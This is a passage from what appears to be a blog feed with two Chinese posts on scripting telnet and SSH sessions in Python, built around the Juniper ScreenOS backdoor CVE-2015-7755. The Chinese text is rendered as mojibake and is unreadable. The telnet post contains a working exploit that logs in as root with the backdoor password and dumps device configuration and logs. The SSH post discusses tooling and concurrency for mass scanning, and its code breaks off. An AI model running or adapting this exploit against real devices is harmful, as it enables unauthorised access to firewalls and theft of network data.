ï¼Œå‘ç°å®ƒæ˜¯æœ‰I/Oæ§åˆ¶çš„ã€‚</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>Juniperè®¾å¤‡ä½¿ç”¨getå‘½ä»¤æ¥è·å–è®¾å¤‡çš„å„ç±»ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ <em><strong>get ?</strong></em> æ¥æŸ¥çœ‹ç›¸å…³å‘½ä»¤ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯2ä¸ªï¼š</p><ul><li><em><strong>get tech-support</strong></em> : å®ƒç»¼åˆäº†å¤§éƒ¨åˆ†getå­å‘½ä»¤çš„ç»“æœã€‚</li><li><em><strong>get event</strong></em> : åŒ…å«äº†è®¾å¤‡æ—¥å¿—ã€‚</li></ul><p>ä½†å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä¸Š2ä¸ªå‘½ä»¤è¿”å›çš„å…¨éƒ¨ä¿¡æ¯æ€»é‡é€šå¸¸æ¯”è¾ƒå¤§ï¼Œä¸€èˆ¬&gt;=40KBï¼Œè€ŒæœåŠ¡ç«¯ä¸æ˜¯ä¸€æ¬¡æ€§å°†ä¿¡æ¯å…¨éƒ¨è¾“å‡ºç»™å®¢æˆ·ç«¯çš„ï¼Œè€Œæ˜¯åˆ†æ‰¹è¾“å‡ºåˆ°ç®¡é“ä¸­çš„ï¼Œå®¢æˆ·ç«¯éœ€è¦ä¸æ–­åœ°é”®å…¥å›è½¦ï¼Œæ¥é¡ºåºè·å–å„ä¸ªä¿¡æ¯åˆ†æ®µã€‚</p><p>è¿™å°±è¦æ±‚ç¨‹åºèƒ½ä¸æ–­è·å–ç»“æœä¿¡æ¯ï¼Œå¹¶æ­£ç¡®åˆ¤æ–­æœ€åä¸€ä¸ªåˆ†æ®µä»¥é€‚æ—¶ç»ˆæ­¢ã€‚</p><a id="more"></a><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, ret, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure><p>ä»£ç è¯´æ˜ï¼š</p><ul><li>5 - 21è¡Œï¼šå®ç°äº†expå‡½æ•°ï¼Œç”¨äºåœ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤cmdï¼Œå¹¶è·å–å…¨éƒ¨çš„è¿”å›ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œ <strong>-&gt;</strong> å­—ç¬¦ä¸²æ˜¯juniperçš„shellè¾“å…¥æç¤ºç¬¦ï¼Œæˆ‘ä»¬é€šè¿‡åˆ¤æ–­å®ƒæ¥è¿‡æ»¤æ‰ä¸Šä¸€æ¬¡çš„å¤šä½™è¾“å‡ºã€‚åœ¨è¿ç»­è·å–ç»“æœåˆ†æ®µçš„è¿‡ç¨‹ä¸­ï¼Œè‹¥å‡ºç°è¶…æ—¶ï¼Œåˆ™ä¼šæœ€å¤šå°è¯•maxToæ¬¡ã€‚</li><li>23 - 42è¡Œï¼šä¸»ä»£ç é€»è¾‘ï¼Œç™»é™†äº†è¿œç«¯telnetï¼Œå¹¶æ‰§è¡Œäº†?å‘½ä»¤ï¼Œåˆ¤æ–­è¿”å›çš„ä¿¡æ¯ä¸­æ˜¯å¦åŒ…å«success_flagå˜é‡å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œé»˜è®¤æ˜¯â€™ping other hostâ€™ï¼Œè‹¥å­˜åœ¨åˆ™æ–­å®šå­˜åœ¨è¯¥æ¼æ´ã€‚è‹¥doExpä¸ºTrueï¼Œåˆ™è¡¨ç¤ºæ‰§è¡ŒExpï¼Œåˆ™ç¨‹åºä¼šè°ƒç”¨exp()å‡½æ•°åˆ†åˆ«æ‰§è¡Œä¸ŠèŠ‚ä¸­æåˆ°2ä¸ªgetå‘½ä»¤å¹¶è·å–å…¨éƒ¨è¿”å›ä¿¡æ¯ã€‚ _<strong>è¿™é‡Œéœ€è¦ç‰¹åˆ«æŒ‡å‡ºçš„æ˜¯ï¼Œè¿”å›çš„techsupportå­—ç¬¦ä¸²ä¸­å¯èƒ½å«æœ‰å„ç§ç‰¹æ®Šç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤è‹¥éœ€å¯¹å…¶è¿›è¡Œè½¬ç æ“ä½œè¯·å†ä¸‰è€ƒè™‘ï¼Œä»¥é˜²æ”¹å˜åŸå§‹æ•°æ®</strong>_ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Security </tag>
            
            <tag> CVE </tag>
            
            <tag> PoC/Exp </tag>
            
            <tag> Telnet </tag>
            
            <tag> Vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonå®ç°ç»ˆç«¯äº¤äº’ â€”â€” ä»¥Juniperåé—¨CVE-2015-7755ä¸ºä¾‹ï¼ˆäºŒï¼‰: SSHç¯‡</title>
      <link href="/tech/shell-interaction-in-python-2-ssh/"/>
      <url>/tech/shell-interaction-in-python-2-ssh/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li><li>Author: dog2</li></ul><hr><h3 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><h4 id="1-æ¨¡å—é€‰æ‹©"><a href="#1-æ¨¡å—é€‰æ‹©" class="headerlink" title="1. æ¨¡å—é€‰æ‹©"></a>1. æ¨¡å—é€‰æ‹©</h4><p>å¯¹äºSSHäº¤äº’è€Œè¨€ï¼Œå¾ˆéš¾ä»¥çº¯socketå»å®ç°ï¼Œå› ä¸ºSSHçš„è®¤è¯è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°å„ç§ç®—æ³•ï¼Œå·¥ä½œé‡å¤ªå¤§ï¼Œå› æ­¤è€ƒè™‘ä½¿ç”¨å·²æœ‰çš„SSHæ¨¡å—å®ç°ã€‚</p><h5 id="1-paramiko"><a href="#1-paramiko" class="headerlink" title="(1) paramiko"></a>(1) paramiko</h5><p>SSHäº¤äº’æœ€å¸¸ç”¨çš„æ˜¯ç¬¬ä¸‰æ–¹æ¨¡å—æ˜¯paramikoï¼š</p><ul><li><span class="exturl" data-url="aHR0cDovL2RvY3MucGFyYW1pa28ub3JnLw==">æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3RyZWUvbWFzdGVyL3BhcmFtaWtv">æºç <i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><p>ä¸‹é¢ç»™å‡ºä½¿ç”¨paramikoè¿›è¡Œsshç™»å½•çš„ä¸€ä¸ªdemo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="literal">True</span>,</span><br><span class="line">            allow_agent=<span class="literal">False</span>,</span><br><span class="line">            look_for_keys=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>ä»£ç è¯´æ˜ï¼š</p><ul><li>17è¡Œï¼šç”¨äºåˆ¤æ–­æ˜¯å¦ç™»å½•æˆåŠŸ</li><li>18è¡Œï¼šç”¨äºè¾“å‡ºssh bannerï¼Œå³ç™»å½•æˆåŠŸåçš„æ¬¢è¿å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚æˆ‘çš„vpsç™»å½•æˆåŠŸåæœ‰å¦‚ä¸‹æ¬¢è¿å­—ç¬¦ä¸²:</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Ubuntu <span class="number">14.04</span><span class="number">.3</span> LTS (GNU/Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:<span class="comment">//help.ubuntu.com/</span></span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> <span class="keyword">from</span> <span class="number">222.222</span><span class="number">.222</span><span class="number">.222</span></span><br><span class="line"><span class="symbol">root@</span>vultr:~# c</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸Šdemoå‡½æ•°å°è¯•ç™»å½•æˆ‘çš„vpsï¼ŒæˆåŠŸç™»å½•å¹¶æ‰“å°äº†lså‘½ä»¤çš„è¾“å‡ºã€‚</p><p>ä½†æ˜¯å­˜åœ¨å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li>ä½¿ç”¨å¦‚ä¸ŠsshLoginå‡½æ•°ç™»å½•juniperè®¾å¤‡ï¼Œä»£ç è¿è¡Œåˆ°17è¡Œæ—¶è¾“å‡ºä¸ºTrueï¼Œè¯´æ˜æˆåŠŸç™»å½•äº†ï¼Œä½†å½“æ‰§è¡Œåˆ°ç¬¬19è¡Œæ—¶ï¼Œä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼š</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, <span class="keyword">line</span> 405, <span class="keyword">in</span> exec_command</span><br><span class="line">    chan.exec_command(command)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="keyword">return</span> func(self, *<span class="keyword">args</span>, **kwds)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 229, <span class="keyword">in</span> exec_command</span><br><span class="line">    self._wait_for_event()</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 1086, <span class="keyword">in</span> _wait_for_event</span><br><span class="line">    raise <span class="keyword">e</span></span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure><p>è¿™ä¼šå¯¼è‡´SSHè¿æ¥çš„ä¸­æ–­ï¼Œå¯¼è‡´è¿™ç§å¼‚å¸¸çš„åŸå› ï¼Œå¯èƒ½æ˜¯juniperè¿™ç§è®¾å¤‡çš„SSHå®ç°æ˜¯éæ ‡å‡†çš„ï¼Œè€Œparamikoå¯¹è¿™äº›éæ ‡å‡†SSHæ”¯æŒä¸ä½³æ‰€è‡´ï¼Œè€Œä½¿ç”¨Unix/Linuxè‡ªå¸¦çš„SSHå®¢æˆ·ç«¯ç¨‹åºç™»é™†è¿™äº›è®¾å¤‡å°±æ²¡æœ‰è¿™ç§é—®é¢˜ã€‚çœ‹æ¥paramikoå¹¶ä¸æ˜¯å®Œç¾çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚æœä»…ä»…éœ€è¦éªŒè¯æ˜¯å¦ç™»é™†æˆåŠŸï¼Œå®ƒè¿˜æ˜¯å¯ä»¥æ»¡è¶³çš„ã€‚</p><ul><li>æ— è®ºç›®æ ‡æ˜¯æˆ‘çš„vpsè¿˜æ˜¯juniperè®¾å¤‡ï¼Œç¬¬18è¡Œè¾“å‡ºçš„éƒ½æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚åœ¨googleä¸Šç™¾åº¦äº†ä¸€ä¸‹ï¼Œæœ‰äººé‡åˆ°ç±»ä¼¼é—®é¢˜ï¼ˆ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL2lzc3Vlcy8yNzM=">#1<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3B1bGwvNTg=">#2<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yNTYwOTE1My9wYXJhbWlrby1lcnJvci1yZWFkaW5nLXNzaC1wcm90b2NvbC1iYW5uZXI=">#3<i class="fa fa-external-link-alt"></i></span>ï¼‰ï¼Œä¹Ÿæœ‰äººåšäº†è§£ç­”ï¼Œä½†å¤§éƒ½è¿˜æ˜¯è¯´è°ƒç”¨get_banner()å‡½æ•°ï¼Œå¹¶ä¸æ˜¯è§£å†³åŠæ³•ã€‚çŒœæµ‹è¿™å¯èƒ½æ˜¯paramikoè‡ªèº«çš„é—®é¢˜ï¼Œæ²¡æœ‰æ·±ç©¶ï¼Œå¦‚æœæ‚¨çŸ¥é“åŸå› åŠè§£å†³åŠæ³•ï¼Œè¿˜è¯·æŒ‡æ•™ã€‚</li></ul><h5 id="2-pexpect"><a href="#2-pexpect" class="headerlink" title="(2) pexpect"></a>(2) pexpect</h5><p>ä»Freebufæ–‡ç«  <span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzkwODg2Lmh0bWw=">â€œåˆ©ç”¨Censysæ‰¹é‡è·å–Juniper Netscreenåé—¨â€<i class="fa fa-external-link-alt"></i></span> ä¸­äº†è§£åˆ°pexpectå¯ä»¥ç”¨æ¥å®ç°SSHäº¤äº’ï¼Œäºæ˜¯ç®€å•äº†è§£ä¸€ç•ªã€‚</p><ul><li><span class="exturl" data-url="aHR0cDovL3BleHBlY3QucmVhZHRoZWRvY3Mub3JnLw==">æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BleHBlY3QvcGV4cGVjdC90cmVlL21hc3Rlci9wZXhwZWN0">æºç <i class="fa fa-external-link-alt"></i></span></li><li>ç›¸å…³èµ„æ–™:<ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDEv">æ¢ç´¢ Pexpectï¼Œç¬¬ 1 éƒ¨åˆ†ï¼šå‰–æ Pexpect<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">æ¢ç´¢ Pexpectï¼Œç¬¬ 2 éƒ¨åˆ†ï¼šPexpect çš„å®ä¾‹åˆ†æ<i class="fa fa-external-link-alt"></i></span></li></ul></li></ul><p>Freebufçš„æ–‡ç« ä¸­æåˆ°äº†ç¼–å†™PoCéªŒè¯è®¾å¤‡æ˜¯å¦è¿˜å­˜åœ¨æ¼æ´çš„æ€è·¯ï¼š</p><blockquote><p>å…¶å®ç”±äºç™»å½•åå¹¶ä¸æ˜¯ä¼ ç»Ÿçš„SSHï¼Œè€Œæ˜¯è¯¥é˜²ç«å¢™çš„æ“ä½œç»ˆç«¯ï¼Œå› æ­¤pxsshä¼šè®¤ä¸ºå¹¶æ²¡æœ‰ç™»å½•æˆåŠŸï¼Œè€Œæ˜¯è¿”å›è¶…æ—¶å¼‚å¸¸ï¼Œæ­¤æ—¶æˆ‘ä»¬æ£€æµ‹å…¶è¿”å›çš„beforeå­—æ®µå¦‚æœæœ‰Remote Management Consoleå­—æ ·å°±è¯´æ˜è¯¥ä¸»æœºå­˜åœ¨åé—¨ã€‚</p></blockquote><p>å…¶ä¸­æåˆ°çš„pxsshæ˜¯pexpectä¸­çš„ä¸€ä¸ªç±»pexpect.pxssh.pxsshï¼Œç¼–å†™SSHäº¤äº’ç¨‹åºéœ€è¦ç”¨åˆ°å®ƒï¼Œä½¿ç”¨ç¤ºä¾‹å‚è§<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBMçš„æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span>ã€‚</p><p>å°è¯•äº†ä¸€ç•ªï¼Œpxsshå…¶å®æ˜¯å¯ä»¥ç™»é™†æˆåŠŸçš„ï¼Œå¹¶æ²¡æœ‰æ–‡ç« ä¸­æ‰€è¯´çš„ â€œè¿”å›å¼‚å¸¸â€ã€‚</p><p>å…¶å®pxsshåº•å±‚å®ç°è¿˜æ˜¯ä»¥è¿›ç¨‹çš„æ–¹å¼è°ƒç”¨Unix/Linuxè‡ªå¸¦çš„SSHå¯æ‰§è¡Œç¨‹åºçš„ï¼Œè€Œæ­£å¦‚ä¸Šé¢æåˆ°çš„è‡ªå¸¦çš„SSHå…¼å®¹æ€§å¾ˆå¼ºï¼Œå› æ­¤ä½¿ç”¨pxsshç¼–å†™PoCæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚</p><p>ä½†è‹¥å°†ç¨‹åºç”¨äºé«˜å¹¶å‘æ‰«æï¼Œéœ€è¦æƒè¡¡ä¸€ä¸‹å¹¶å‘æ•°ä¸æœºå™¨æ€§èƒ½ï¼Œå› ä¸ºæ¯æ‰«æä¸€ä¸ªç›®æ ‡å°±éœ€è¦è¿è¡Œä¸€ä¸ªSSHå®¢æˆ·ç«¯ç¨‹åºè¿›ç¨‹ã€‚</p><h4 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h4><p>PoCå¯ä»¥ç¼–å†™äº†ï¼Œæ¥ä¸‹æ¥æ˜¯Expï¼Œç›®æ ‡è¿˜æ˜¯æ‰§è¡Œå¦‚ä¸‹2ä¸ªå‘½ä»¤ï¼š</p><ul><li><em><strong>get tech-support</strong></em> : å®ƒç»¼åˆäº†å¤§éƒ¨åˆ†getå­å‘½ä»¤çš„ç»“æœã€‚</li><li><em><strong>get event</strong></em> : åŒ…å«äº†è®¾å¤‡æ—¥å¿—ã€‚</li></ul><p>SSH Expçš„é€»è¾‘ä¸Telnetå‡ ä¹ä¸€æ ·ï¼Œä½†æ˜¯ pexpect.pxssh.pxssh ç±»ä¸­å¹¶æ²¡æœ‰ç±»ä¼¼äº telnetlib.Telnet ç±»ä¸­çš„ read_until(expected[, timeout]) è¿™ç§å‡½æ•°ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ä¾‹å‡½æ•° pxssh.sendline(cmd) æ¥å‘é€å‘½ä»¤ï¼Œå…¶ä¸­cmdä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œç»“å°¾ä¸å¿…åŒ…å«\nï¼Œå‡½æ•°ä¼šåœ¨å‘½ä»¤ç»“å°¾è‡ªåŠ¨æ·»åŠ ã€‚</p><p>ä½†ä½¿ç”¨pxsshç¼–å†™Expï¼Œè¿˜æ˜¯å­˜åœ¨å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li>pxsshé»˜è®¤å°†ä¸Šä¸€æ¬¡å‘½ä»¤æ‰§è¡Œåè¿”å›çš„ç»“æœå­—ç¬¦ä¸²å­˜å‚¨åœ¨å®ä¾‹å˜é‡pxssh.beforeä¸­ï¼Œä½†æ˜¯åœ¨å¤šæ¬¡è·å–ç»“æœåˆ†æ®µæ—¶ï¼Œè¿ç»­2æ¬¡è·å–çš„æ¶ˆæ¯åˆ†æ®µä¼šæœ‰é‡å ã€‚</li><li>ä»æºç å¯ä»¥çœ‹åˆ°pxsshç±»ç»§æ‰¿è‡ªpexpect.pyt_spawn.spawnç±»ï¼Œè€Œspawnç±»åˆç»§æ‰¿è‡ªpexpect.spawnbase.SpawnBaseç±»ã€‚åœ¨SpawnBaseç±»ä¸­ï¼Œå­˜åœ¨ç±»å˜é‡bufferï¼Œç”¨äºæ¥æ”¶æœåŠ¡å™¨ç«¯å‘å›çš„æ¶ˆæ¯ã€‚å› æ­¤å°è¯•ç›´æ¥ä½¿ç”¨pxssh.bufferå˜é‡æ¥ä»£æ›¿beforeå˜é‡ï¼Œå¹¶åœ¨æ¯ä¸€æ¬¡å‘é€æ–°çš„å‘½ä»¤ä¹‹å‰ï¼Œå°†pxssh.bufferæ¸…ç©ºï¼Œä½†æ˜¯åˆå‡ºç°äº†ç»“æœä¸å®Œæ•´çš„é—®é¢˜ã€‚</li><li>å¯ä»¥å°è¯•ä½¿ç”¨<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBMçš„æ–‡ç« <i class="fa fa-external-link-alt"></i></span>ä¸­ â€œä¾‹ 3ï¼šssh çš„ä½¿ç”¨â€ æåˆ°çš„ï¼Œç›´æ¥ä½¿ç”¨spawnç±»æ¥å®ç°ï¼Œä½†æ˜¯è¯¥ç±»è¾ƒä¸ºåº•å±‚ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å¤„ç†SSHçš„ç™»å½•åŠäº¤äº’é€»è¾‘ï¼Œä¸”å…¶ä¸­expectå‡½æ•°çš„patternå‚æ•°éœ€ä¸ºpexpect.expectä¸­å®šä¹‰çš„ç±»å®ä¾‹ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¼ å…¥å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½¿ç”¨èµ·æ¥è¾ƒä¸ºç¹çã€‚</li></ul><p>æœ€ç»ˆæ‰¾åˆ°äº†åˆé€‚çš„ç±»å‡½æ•° pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ï¼Œå®ƒè¯»å–æœåŠ¡å™¨ç«¯å‘æ¥çš„æ•°æ®ï¼Œç›´åˆ°æ•°æ®å­—èŠ‚æ•°è¾¾åˆ°sizeï¼Œæˆ–è€…è¾¾åˆ°è¶…æ—¶æ—¶é—´timeoutã€‚ä½†ç»ˆæ­¢å­—ç¬¦ä¸²å°±è¿˜éœ€ç”±æˆ‘ä»¬è‡ªå·±åˆ¤æ–­ã€‚</p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 